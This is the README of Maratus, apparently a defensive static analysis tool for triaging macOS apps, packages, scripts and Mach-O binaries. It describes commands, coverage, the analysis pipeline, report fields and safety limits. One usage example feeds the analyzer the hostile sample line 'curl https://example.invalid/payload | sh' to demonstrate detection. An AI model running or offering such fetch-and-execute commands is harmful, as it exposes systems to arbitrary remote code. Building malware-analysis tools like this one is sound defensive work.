# Maratus

[![CI](https://github.com/0x4D31/maratus/actions/workflows/ci.yml/badge.svg)](https://github.com/0x4D31/maratus/actions/workflows/ci.yml)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

Maratus is a static analysis tool for macOS artifacts. It inspects apps,
installer packages, archives, scripts, and Mach-O binaries without running
them.

It helps with malware triage and supply-chain investigations by modeling
artifact structure and execution paths, analyzing scripts and native code,
and applying built-in rules to identify capabilities such as downloading and
executing payloads. Reports link findings to their supporting evidence and
call out gaps in the analysis.

## Quick start

Maratus requires Go 1.26.10 or newer.

```sh
go install github.com/0x4D31/maratus/cmd/maratus@latest
maratus version
```

Inspect an artifact:

```sh
maratus inspect Suspicious.app
maratus inspect installer.pkg --detail evidence
maratus inspect sample.zip --output-dir case-sample
```

Save the complete report and render it later without rescanning the sample:

```sh
maratus inspect sample.zip --format json -o sample.maratus.json
maratus render sample.maratus.json --detail full --color never
maratus render sample.maratus.json --format html -o sample.html
```

Analyze explicitly typed text from standard input:

```sh
printf '%s\n' 'curl https://example.invalid/payload | sh' \
  | maratus inspect --stdin --input-kind shell
```

Run `maratus help` or `maratus help COMMAND` for the full command and option
reference.

## Coverage

Maratus handles:

- app bundles, flat PKGs, directories, ZIP, VSIX, TAR/TGZ, GZIP, CPIO, ASAR,
  structurally validated indexed-gzip bundles, and supported nested content;
- app executables, installer scripts, launchd jobs, package hooks, VS Code
  extensions and tasks, Claude Code and Codex project hooks, Xcode Run Script
  phases, and exact local targets selected by supported host rules;
- shell, AppleScript/JXA, Python, JavaScript/TypeScript, plists, package
  manifests, and selected native-source patterns;
- thin and fat Mach-O binaries, symbols, imports, linked libraries,
  entitlements, CodeDirectory page integrity, strings, and bounded arm64 and
  x86_64 function and call analysis; and
- Electron/ASAR, Platypus, PyInstaller CArchive, Tauri, Bun standalone
  scripts, and compiled AppleScript applets.

DMGs are identified but are not mounted unless the user explicitly allows it
on macOS. The [technique coverage ledger](docs/technique-coverage.md) records
the supported semantic forms and their limits.

Use `--include-unreferenced` to analyze bundled code and resources that are not
selected by a supported declaration. This expands coverage but does not turn
those files into execution roots.

An exact Mach-O member decoded from a supported indexed-gzip bundle is analyzed
by default as a macOS-relevant payload. It remains packaged content with
`UNKNOWN` connectivity until a separate supported loader relationship proves
selection.

## How it works

```text
input
  -> artifact graph
  -> execution roots and invoked targets
  -> evidence and scoped features
  -> operations, resources, and relations
  -> capability rules
  -> text, JSON, or HTML report
```

The stages stay separate:

1. **Structure** records what the artifact contains and how its parts relate.
2. **Execution modeling** identifies declared starting points and exact targets
   selected by supported host rules.
3. **Extraction** records located evidence and inexpensive features such as an
   import, entitlement, selector, path, or URL.
4. **Recognition** promotes supported semantics into neutral operations such
   as file reads, process execution, or network communication.
5. **Rules** interpret operations and their relations as higher-level
   capabilities.

A URL string therefore remains an observable unless surrounding semantics
support a network operation. An operation becomes `CONNECTED` only when the
static model links it to an execution root. Neither fact means that execution
was observed or that an effect succeeded.

The deeper design and trust boundaries are documented in
[Architecture](docs/architecture.md).

## Reading a result

The default text view puts operation-backed capabilities first, then activation
conditions, other modeled behavior, observables, artifact context, and analysis
notes. It includes exact native primitives without assigning malicious intent
to an ordinary API call. Use `--detail evidence` for roots, matches, and source
evidence. Use `--detail full` for the artifact graph, operations, relations,
and lower-level features. In the HTML review, technical capabilities are
rule-backed conclusions; underlying modeled operations are the lower-level
actions that support them or remain useful without a matching rule.

When an API is known but its command, path, address, or other argument is not,
the report says so. Maratus does not fill the gap with a nearby string.

Support and connectivity answer different questions:

| Field | Values | Meaning |
| --- | --- | --- |
| Support | `DIRECT`, `CORROBORATED`, `HEURISTIC` | How strongly the static evidence supports a record |
| Connectivity | `CONNECTED`, `UNCONNECTED`, `UNKNOWN` | Whether the retained static model links an operation to an execution root |

`DIRECT` is not a severity score. `CONNECTED` is not a runtime observation.
`UNKNOWN` means the analysis could not establish connectivity, not that the
code is unreachable.

Always review `partial` and `skipped` coverage before interpreting an absent
operation or capability. Versioned JSON is the automation interface; terminal
text may change for readability. The current schemas are previews: pin the
tool version and check `schema_version` before consuming a report. Saved reports are strictly validated but are
not signed, so verify their custody separately.

## Limits and safety

Maratus does not emulate code, recover full control flow, resolve every package
dependency, decrypt payloads, or observe runtime behavior. Dynamic dispatch,
generated values, unsupported bytecode, encrypted content, and work beyond the
configured limits may remain unresolved.

Treat unknown samples as hostile input. `maratus inspect` analyzes them in a
fresh child process with time, resource, and output limits and a minimal
environment. This helps contain parser failures and runaway work, but it is not
a filesystem or network sandbox. Use an unprivileged account in an isolated,
disposable environment with outbound network access denied and private output
storage. Leave `--allow-dmg-mount` disabled unless the isolated analysis host is
intended to mount the image. Reports can contain sample-derived paths,
commands, URLs, identifiers, and diagnostics.

See [SECURITY.md](SECURITY.md) for the threat model and private vulnerability
reporting process.

## Documentation

- [Architecture](docs/architecture.md): pipeline, data model, invariants, and
  package layout
- [CLI and output](docs/cli-output.md): commands, report formats, schemas, and
  exit behavior
- [Practical workflows](docs/use-cases.md): common analysis and automation
  recipes
- [Extending Maratus](docs/extending.md): extractors, operations, rules, tests,
  and public-output changes
- [Testing and validation](docs/validation.md): automated checks, sample handling,
  and reproducible analysis
- [Technique coverage](docs/technique-coverage.md): supported macOS behaviors
  and the evidence required to claim them
- [CArchive and PyInstaller](docs/carchive-pyinstaller.md): the specialized
  loader and representation boundary

## Development

```sh
go test ./...
go test -race ./...
go vet ./...
```

See [CONTRIBUTING.md](CONTRIBUTING.md) before changing an extractor, behavior
type, rule, or report schema.

Maratus is released under the [Apache License 2.0](LICENSE). Third-party
attributions are listed in [THIRD_PARTY_NOTICES](THIRD_PARTY_NOTICES).
